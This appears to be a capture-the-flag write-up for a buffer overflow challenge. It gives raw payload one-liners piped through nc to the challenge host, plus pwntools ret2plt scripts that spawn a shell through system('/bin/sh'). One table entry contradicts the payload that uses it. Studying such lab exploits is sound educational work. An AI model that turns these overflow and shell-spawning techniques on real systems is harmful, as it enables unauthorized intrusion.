# Problem description
Can you get the flag?

# Solutions
## 1st attack: Overwrite 'secret' parameter
`(python -c 'print "A" * 48 + "\xbe\xba\xfe\xca"'; cat -) | nc kfoens.com 8001`

## 2nd attack: Return to just after the if(secret) check
| Thing                             | Addres     | Reversed in python |
| --------------------------------- |:-----------|:-------------------|
| "offset command" memory location: | 0x0804850e | "\x0e\x85\x04\x08" |

`(python -c 'print "A" * 44 + "\x0e\x85\x04\x08"'; cat -) | nc kfoens.com 8001`

or if we want the welcome greeting: 

`(python -c 'print "A" * 44 + "\xed\x84\x04\x08"'; cat -) | nc kfoens.com 8001`

## 3rd attack: ret2plt (kinda like ret2libc)
We find the relevant addresses:
| Thing                          | Addres     | Reversed in python |
| ------------------------------ |:-----------|:-------------------|
| system() memory location (plt) | 0x08048380 | "\x80\x83\x04\x08" |
| "/bin/sh" memory location      | 0x08048647 | "\x47\x98\x04\x08" |

`(python -c 'print "A" * 44 + "\x80\x83\x04\x08" + "SEXY" + "\x47\x86\x04\x08"'; cat -) | nc kfoens.com 8001`

### Can also use pwntools
#### Version 1
```pythong
#!/usr/bin/env python2

from pwn import *

context(arch = 'i386', os = 'linux')

RET_OFFSET = 44
PROGRAM = './buffer_overflow.bin'

e = ELF(PROGRAM)
r = process(PROGRAM)

print r.readline()
r.sendline(flat(
    'A' * RET_OFFSET,          #Junk till saved return address
    e.plt['system'],           #Overwrite saved return address
    0xc0debabe,                #Return address from 'system'
    next(e.search('/bin/sh'))  #Argument for 'system'
))
print r.readline()
r.interactive()
```
#### Version 2
```python
#!/usr/bin/env python2

from pwn import *

context(arch = 'i386', os = 'linux')

RET_OFFSET = 44
PROGRAM = './buffer_overflow.bin'

e = ELF(PROGRAM)

rop = ROP(e)
rop.system(next(e.search('/bin/sh')))

r = process(PROGRAM)
print r.readline()
r.sendline(flat(
    'A' * RET_OFFSET,
    rop.chain()
))
print r.readline()
r.interactive()
```